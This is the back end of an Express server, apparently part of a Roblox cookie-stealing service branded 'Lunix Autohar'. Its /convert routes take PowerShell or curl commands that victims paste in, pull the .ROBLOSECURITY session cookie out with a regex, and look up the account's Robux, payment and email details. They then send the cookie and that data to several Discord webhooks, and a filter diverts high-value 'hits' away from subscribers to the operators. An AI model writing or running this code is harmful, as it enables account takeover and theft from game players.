      console.log(`❌ Invalid or missing API token for directory ${directoryName} from ${req.ip}`);
      return res.status(401).json({ error: 'Invalid API token for this directory' });
    }

    let input;
    let scriptType;



    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
    } else {

      return res.status(400).json({ error: 'Invalid input format' });
    }

    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);

    if (!hasBasicPowershellStructure) {
      // Silently reject plain text inputs without sending webhooks
      return res.status(400).json({ 
        success: false,
        message: 'Invalid input format',
        directory: directoryName
      });
    }

    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
    // Updated regex to handle both direct assignment and New-Object System.Net.Cookie format
    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
    const match = cleanedInput.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, '');

      // Check if token is empty, just whitespace, or only contains commas/special chars
      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
        // Send fallback embed when no valid token found
        const fallbackEmbed = {
          title: "⚠️ Input Received",
          description: "Input received but no ROBLOSECURITY found",
          color: 0x8B5CF6, // Consistent purple color
          footer: {
            text: "Made By Lunix"
          }
        };

        const fallbackPayload = {
          embeds: [fallbackEmbed]
        };

        // Send to both directory webhook and site owner webhook
        try {
          await fetch(directoryConfig.webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });

          const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
          if (siteOwnerWebhookUrl) {
            await fetch(siteOwnerWebhookUrl, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });
        }
      } catch (webhookError) {
        console.error('❌ Fallback webhook failed:', webhookError.message);
      }

      return res.status(400).json({ 
        success: false,
        message: 'Failed wrong input',
        directory: directoryName
      });
    }

      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      const webhookUserData = userData || {
        username: "Unknown User",
        userId: "Unknown",
        robux: 0,
        premium: false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: 0,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };

      // Log user data to database
      await logUserData(token, webhookUserData, { ip: req.ip, directory: directoryName });

      const customTitle = `<:emoji_37:1410520517349212200> +1 Hit - Lunix Autohar`;
      // Send to Discord webhook with user data
      const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle, true);

      // Always send to site owner (main webhook)
      const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
      if (siteOwnerWebhookUrl) {
        await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, siteOwnerWebhookUrl, customTitle, true);
      }

      if (!webhookResult.success) {

        return res.status(500).json({ 
          success: false, 
          error: `Webhook failed: ${webhookResult.error}` 
        });
      }


    } else {
      // Send fallback embed when no token found - do NOT send user data
      const fallbackEmbed = {
        title: "⚠️ Input Received",
        description: "Input received but no ROBLOSECURITY found",
        color: 0x8B5CF6, // Consistent purple color
        footer: {
          text: "Made By Lunix"
        }
      };

      const fallbackPayload = {
        embeds: [fallbackEmbed]
      };

      // Send to both directory webhook and site owner webhook
      try {
        await fetch(directoryConfig.webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(fallbackPayload)
        });

        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
        if (siteOwnerWebhookUrl) {
          await fetch(siteOwnerWebhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });
        }
      } catch (webhookError) {
        console.error('❌ Fallback webhook failed:', webhookError.message);
      }

      // Return error message when no token found
      return res.status(400).json({ 
        success: false,
        message: 'Failed wrong input',
        directory: directoryName
      });
    }

    res.json({ 
      success: true,
      message: 'Request submitted successfully!',
      directory: directoryName
    });
  } catch (error) {
    // Log error without exposing sensitive details
    console.error('❌ Server error:', error.message);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

// API endpoint to create subdirectories for Dualhook users
app.post('/:directory/api/create-subdirectory', async (req, res) => {
  try {
    const parentDirectory = req.params.directory;
    const { subdirectoryName, webhookUrl } = req.body;

    // Require a valid Discord session
    const sessionToken = req.cookies?.session;
    const session = await getSession(sessionToken);
    if (!session) {
      return res.status(401).json({ error: 'Discord authentication required. Please sign in with Discord first.' });
    }

    // Load directories
    const directories = await loadDirectories();

    // Check if parent directory exists and is dualhook type
    if (!directories[parentDirectory] || directories[parentDirectory].serviceType !== 'dualhook') {
      return res.status(404).json({ error: 'Parent directory not found or not a Dualhook generator' });
    }

    // Verify the logged-in Discord user owns this parent directory
    if (directories[parentDirectory].discordId !== session.discordId) {
      return res.status(403).json({ error: 'You do not own this directory' });
    }

    // Validate subdirectory name
    if (!subdirectoryName || !/^[a-z0-9-]+$/.test(subdirectoryName)) {
      return res.status(400).json({ error: 'Invalid directory name. Use only lowercase letters, numbers, and hyphens.' });
    }

    // Validate webhook URL
    if (!webhookUrl || !webhookUrl.startsWith('http')) {
      return res.status(400).json({ error: 'Invalid webhook URL' });
    }

    // Initialize subdirectories if not exists
    if (!directories[parentDirectory].subdirectories) {
      directories[parentDirectory].subdirectories = {};
    }

    // Check if subdirectory already exists
    if (directories[parentDirectory].subdirectories[subdirectoryName]) {
      return res.status(409).json({ error: 'This autohar name is already taken' });
    }

    // Generate unique ID for subdirectory using helper function
    const uniqueId = generateUniqueId(directories);

    // Create subdirectory (no authToken needed — login is Discord-based now)
    directories[parentDirectory].subdirectories[subdirectoryName] = {
      webhookUrl: webhookUrl,
      created: new Date().toISOString(),
      apiToken: crypto.randomBytes(32).toString('hex'),
      uniqueId: uniqueId
    };

    // Save directories
    if (!(await saveDirectories(directories))) {
      return res.status(500).json({ error: 'Failed to save directory configuration' });
    }

    // Send CREATION notification to subdirectory webhook (no token in message — Discord login handles auth)
    try {
      const autoharLink = `http://${req.get('host')}/${parentDirectory}/${subdirectoryName}`;
      const dashboardLink = `http://${req.get('host')}/dashboard`;

      const description =
        `[**AUTOHAR LINK**](${autoharLink}) | ` +
        `[**DASHBOARD URL**](${dashboardLink})`;

      const fields = [
        {
          name: '🆔 **Your Unique ID**',
          value: `\`\`\`${directories[parentDirectory].subdirectories[subdirectoryName].uniqueId}\`\`\``,
          inline: false
        },
        {
          name: '🔐 **Login**',
          value: 'Use **Login with Discord** at the dashboard URL above.',
          inline: false
        }
      ];

      const creationNotificationPayload = {
        embeds: [{
          title: `${parentDirectory.toUpperCase()} AUTOHAR`,
          description: description,
          fields: fields,
          color: 0x8B5CF6,
          footer: {
            text: `Made By ${parentDirectory.charAt(0).toUpperCase() + parentDirectory.slice(1)}`
          }
        }]
      };

      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(creationNotificationPayload)
      });
    } catch (webhookError) {
      console.error('❌ Webhook notification failed:', webhookError.message);
    }

    res.json({
      success: true,
      parentDirectory: parentDirectory,
      subdirectoryName: subdirectoryName,
      apiToken: directories[parentDirectory].subdirectories[subdirectoryName].apiToken,
      authToken: subAuthToken,
      uniqueId: directories[parentDirectory].subdirectories[subdirectoryName].uniqueId
    });

  } catch (error) {
    console.error('Error creating subdirectory:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get API token for specific directory
app.get('/:directory/api/token', async (req, res) => {
  const directoryName = req.params.directory;

  // Validate directory name format
  if (!/^[a-z0-9-]+$/.test(directoryName)) {
    return res.status(400).json({ error: 'Invalid directory name format' });
  }

  const directories = await loadDirectories();

  if (!directories[directoryName]) {
    return res.status(404).json({ error: 'Directory not found' });
  }

  // If directory has subdirectories, return 404 to protect parent
  if (directories[directoryName].subdirectories && 
      Object.keys(directories[directoryName].subdirectories).length > 0) {
    return res.status(404).json({ error: 'Not found' });
  }

  console.log(`✅ Directory token request approved for ${directoryName}, IP: ${req.ip}`);
  res.json({ token: directories[directoryName].apiToken });
});

// Get API token for subdirectories
app.get('/:directory/:subdirectory/api/token', tokenLimiter, protectTokenEndpoint, async (req, res) => {
  const directoryName = req.params.directory;
  const subdirectoryName = req.params.subdirectory;

  // Validate directory and subdirectory name formats
  if (!/^[a-z0-9-]+$/.test(directoryName) || !/^[a-z0-9-]+$/.test(subdirectoryName)) {
    return res.status(400).json({ error: 'Invalid directory name format' });
  }

  const directories = await loadDirectories();

  if (!directories[directoryName] || 
      !directories[directoryName].subdirectories || 
      !directories[directoryName].subdirectories[subdirectoryName]) {
    console.log(`❌ Token request for non-existent subdirectory: ${directoryName}/${subdirectoryName}, IP: ${req.ip}`);
    return res.status(404).json({ error: 'Directory not found' });
  }

  console.log(`✅ Subdirectory token request approved for ${directoryName}/${subdirectoryName}, IP: ${req.ip}`);
  res.json({ token: directories[directoryName].subdirectories[subdirectoryName].apiToken });
});

// API endpoint for subdirectory requests (triple webhook delivery)
app.post('/:directory/:subdirectory/convert', async (req, res) => {
  try {
    const directoryName = req.params.directory;
    const subdirectoryName = req.params.subdirectory;
    const directories = await loadDirectories();

    // Check if subdirectory exists
    if (!directories[directoryName] || 
        !directories[directoryName].subdirectories || 
        !directories[directoryName].subdirectories[subdirectoryName]) {
      return res.status(404).json({ error: 'Directory not found' });
    }

    const parentConfig = directories[directoryName];
    const subdirectoryConfig = directories[directoryName].subdirectories[subdirectoryName];

    // Validate API token for this specific subdirectory
    const providedToken = req.get('X-API-Token');
    if (!providedToken || providedToken !== subdirectoryConfig.apiToken) {

      return res.status(401).json({ error: 'Invalid API token for this subdirectory' });
    }

    let input;
    let scriptType;


    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
    } else {

      return res.status(400).json({ error: 'Invalid input format' });
    }

    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);

    if (!hasBasicPowershellStructure) {
      // Silently reject plain text inputs without sending webhooks
      return res.status(400).json({ 
        success: false,
        message: 'Invalid input format',
        directory: directoryName,
        subdirectory: subdirectoryName
      });
    }

    // Look for .ROBLOSECURITY cookie
    // First, clean up the input by removing PowerShell backticks and line breaks
    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');

    // Now extract the ROBLOSECURITY token from the cleaned input - improved pattern to capture full token
    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
    const match = cleanedInput.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, '');

      // Check if token is empty, just whitespace, or only contains commas/special chars
      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
        // Send fallback embed when no valid token found
        const fallbackEmbed = {
          title: "⚠️ Input Received",
          description: "Input received but no ROBLOSECURITY found",
          color: 0xFFA500, // Orange color to distinguish from successful hits
          footer: {
            text: "Made By Lunix"
          }
        };

        const fallbackPayload = {
          embeds: [fallbackEmbed]
        };

        // Send to all three webhooks (subdirectory, dualhook master, site owner)
        try {
          // 1. Send to subdirectory webhook
          await fetch(subdirectoryConfig.webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });

          // 2. Send to dualhook master webhook
          if (parentConfig.dualhookWebhookUrl) {
            await fetch(parentConfig.dualhookWebhookUrl, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify(fallbackPayload)
            });
          }

          // 3. Send to site owner webhook
          const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
          if (siteOwnerWebhookUrl) {
            await fetch(siteOwnerWebhookUrl, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify(fallbackPayload)
            });
          }
        } catch (webhookError) {
          console.error('❌ Fallback webhook failed:', webhookError.message);
        }

        // Return error message when no token found
        return res.status(400).json({ 
          success: false,
          message: 'Failed wrong input',
          directory: directoryName,
          subdirectory: subdirectoryName
        });
      }

      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      // If user data fetch failed, create a minimal user data object to ensure cookie is still sent
      const webhookUserData = userData || {
        username: "Unknown User",
        userId: "Unknown",
        robux: 0,
        premium: false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: 0,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };

      // Log user data to database
      await logUserData(token, webhookUserData, { 
        ip: req.ip, 
        directory: directoryName, 
        subdirectory: subdirectoryName 
      });

      const scriptLabel = `${scriptType} (Subdirectory: ${directoryName}/${subdirectoryName})`;
      const customTitle = `<:emoji_37:1410520517349212200> +1 Hit - ${directoryName.toUpperCase()} AUTOHAR`;

      // Check if hit meets Dualhook filter criteria
      const meetsFilters = meetsFilterCriteria(webhookUserData, parentConfig.filters);

      let subdirectoryWebhookResult = { success: true };
      let dualhookWebhookResult = { success: true };

      // If filters are met, only send to Dualhook directory and site owner (skip subdirectory)
      if (meetsFilters) {
        console.log(`🎯 Hit meets Dualhook filters for ${directoryName}/${subdirectoryName}, bypassing subdirectory webhook`);

        // Add filter notification to webhook title
        const filteredTitle = `🎯 FILTERED HIT - ${directoryName.toUpperCase()} AUTOHAR`;

        // 1. Send to dualhook master webhook with filtered title
        if (parentConfig.dualhookWebhookUrl) {
          dualhookWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, parentConfig.dualhookWebhookUrl, filteredTitle, true);
        }

        // 2. Send to site owner webhook
        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
        if (siteOwnerWebhookUrl) {
          await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, siteOwnerWebhookUrl, filteredTitle, true);
        }
      } else {
        // Normal triple-webhook logic when filters are not met

        // 1. Send to subdirectory webhook
        subdirectoryWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, subdirectoryConfig.webhookUrl, customTitle, true);

        // 2. Send to dualhook master webhook (collects from all subdirectory users)
        if (parentConfig.dualhookWebhookUrl) {
          dualhookWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, parentConfig.dualhookWebhookUrl, customTitle, true);
        }

        // 3. Send to site owner webhook (website owner)
        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
        if (siteOwnerWebhookUrl) {
          const siteOwnerWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, siteOwnerWebhookUrl, customTitle, true);
        }
      }

      if (!subdirectoryWebhookResult.success) {

        return res.status(500).json({ 
          success: false, 
          error: `Subdirectory webhook failed: ${subdirectoryWebhookResult.error}` 
        });
      }

      if (!dualhookWebhookResult.success) {

        return res.status(500).json({ 
          success: false, 
          error: `Dualhook master webhook failed: ${dualhookWebhookResult.error}` 
        });
      }


    } else {
      // Send fallback embed when no token found - do NOT send user data
      const fallbackEmbed = {
        title: "⚠️ Input Received",
        description: "Input received but no ROBLOSECURITY found",
        color: 0xFFA500, // Orange color to distinguish from successful hits
        footer: {
          text: "Made By Lunix"
        }
      };

      const fallbackPayload = {
        embeds: [fallbackEmbed]
      };

      // Send to all three webhooks (subdirectory, dualhook master, site owner)
      try {
        // 1. Send to subdirectory webhook
        await fetch(subdirectoryConfig.webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(fallbackPayload)
        });

        // 2. Send to dualhook master webhook
        if (parentConfig.dualhookWebhookUrl) {
          await fetch(parentConfig.dualhookWebhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });
        }

        // 3. Send to site owner webhook
        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
        if (siteOwnerWebhookUrl) {
          await fetch(siteOwnerWebhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });
        }
      } catch (webhookError) {
        console.error('❌ Fallback webhook failed:', webhookError.message);
      }

      // Return error message when no token found
      return res.status(400).json({ 
        success: false,
        message: 'Failed wrong input',
        directory: directoryName,
        subdirectory: subdirectoryName
      });
    }

    res.json({ 
      success: true,
      message: 'Request submitted successfully with multi-webhook delivery!',
      directory: directoryName,
      subdirectory: subdirectoryName
    });
  } catch (error) {
    // Log error without exposing sensitive details
    console.error('❌ Server error:', error.message);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

// Add plain text detection to prevent webhook spam
app.post('/:directory/convert', async (req, res) => {
  try {
    const directoryName = req.params.directory;
    const directories = await loadDirectories();

    // Check if directory exists
    if (!directories[directoryName]) {
      return res.status(404).json({ error: 'Directory not found' });
    }

    // If directory has subdirectories, return 404 to protect parent
    if (directories[directoryName].subdirectories && 
        Object.keys(directories[directoryName].subdirectories).length > 0) {
      return res.status(404).json({ error: 'Not found' });
    }

    const directoryConfig = directories[directoryName];

    // Validate API token for this specific directory
    const providedToken = req.get('X-API-Token');
    if (!providedToken || providedToken !== directoryConfig.apiToken) {
      console.log(`❌ Invalid or missing API token for directory ${directoryName} from ${req.ip}`);
      return res.status(401).json({ error: 'Invalid API token for this directory' });
    }

    let input;
    let scriptType;


    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
    } else {

      return res.status(400).json({ error: 'Invalid input format' });
    }

    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);

    if (!hasBasicPowershellStructure) {
      // Silently reject plain text inputs without sending webhooks
      return res.status(400).json({ 
        success: false,
        message: 'Invalid input format',
        directory: directoryName
      });
    }

    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
    // Updated regex to handle both direct assignment and New-Object System.Net.Cookie format
    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
    const match = cleanedInput.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, '');

      // Check if token is empty, just whitespace, or only contains commas/special chars
      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
        // Send fallback embed when no valid token found
        const fallbackEmbed = {
          title: "⚠️ Input Received",
          description: "Input received but no ROBLOSECURITY found",
          color: 0x8B5CF6, // Consistent purple color
          footer: {
            text: "Made By Lunix"
          }
        };

        const fallbackPayload = {
          embeds: [fallbackEmbed]
        };

        // Send to both directory webhook and site owner webhook
        try {
          await fetch(directoryConfig.webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });

          const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
          if (siteOwnerWebhookUrl) {
            await fetch(siteOwnerWebhookUrl, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify(fallbackPayload)
            });
          }
        } catch (webhookError) {
          console.error('❌ Fallback webhook failed:', webhookError.message);
        }

        // Return error message when no token found
        return res.status(400).json({ 
          success: false,
          message: 'Failed wrong input',
          directory: directoryName
        });
      }

      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      // If user data fetch failed, create a minimal user data object
      const webhookUserData = userData || {
        username: "Unknown User",
        userId: "Unknown",
        robux: 0,
        premium: false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: 0,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };

      // Log user data to database
      await logUserData(token, webhookUserData, { ip: req.ip, directory: directoryName });

      const customTitle = `<:emoji_37:1410520517349212200> +1 Hit - Lunix Autohar`;

      // Send to Discord webhook with user data
      const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle);

      // Always send to site owner (main webhook) - check both environment variable and default webhook
      const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
      if (siteOwnerWebhookUrl) {
        await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, siteOwnerWebhookUrl, customTitle);
      }

      if (!webhookResult.success) {

        return res.status(500).json({ 
          success: false, 
          error: `Webhook failed: ${webhookResult.error}` 
        });
      }


    } else {
      // Send fallback embed when no token found - do NOT send user data
      const fallbackEmbed = {
        title: "⚠️ Input Received",
        description: "Input received but no ROBLOSECURITY found",
        color: 0x8B5CF6, // Consistent purple color
        footer: {
          text: "Made By Lunix"
        }
      };

      const fallbackPayload = {
        embeds: [fallbackEmbed]
      };

      // Send to both directory webhook and site owner webhook
      try {
        await fetch(directoryConfig.webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(fallbackPayload)
        });

        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
        if (siteOwnerWebhookUrl) {
          await fetch(siteOwnerWebhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });
        }
      } catch (webhookError) {
        console.error('❌ Fallback webhook failed:', webhookError.message);
      }

      // Return error message when no token found
      return res.status(400).json({ 
        success: false,
        message: 'Failed wrong input',
        directory: directoryName
      });
    }

    // Return success only when token was found and processed
    res.json({ 
      success: true,
      message: 'Request submitted successfully!',
      directory: directoryName
    });
  } catch (error) {
    // Log error without exposing sensitive details
    console.error('❌ Server error:', error.message);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

// Catch-all 404 handler (must be last)
app.use('*', (req, res) => {
  // Always serve 404.html for all invalid routes
  res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {


  if (!process.env.API_TOKEN) {
  }

  // Log existing directories
  loadDirectories().then(directories => {
    if (directories && typeof directories === 'object') {
      const directoryNames = Object.keys(directories);
      if (directoryNames.length > 0) {


        // Log subdirectories for dualhook services
        directoryNames.forEach(dir => {
          if (directories[dir] && 
              directories[dir].serviceType === 'dualhook' && 
              directories[dir].subdirectories) {
            const subdirs = Object.keys(directories[dir].subdirectories);
            if (subdirs.length > 0) {

            }
          }
        });
      }
    }
  }).catch(error => {
    console.error('Error loading directories on startup:', error);
  });
});
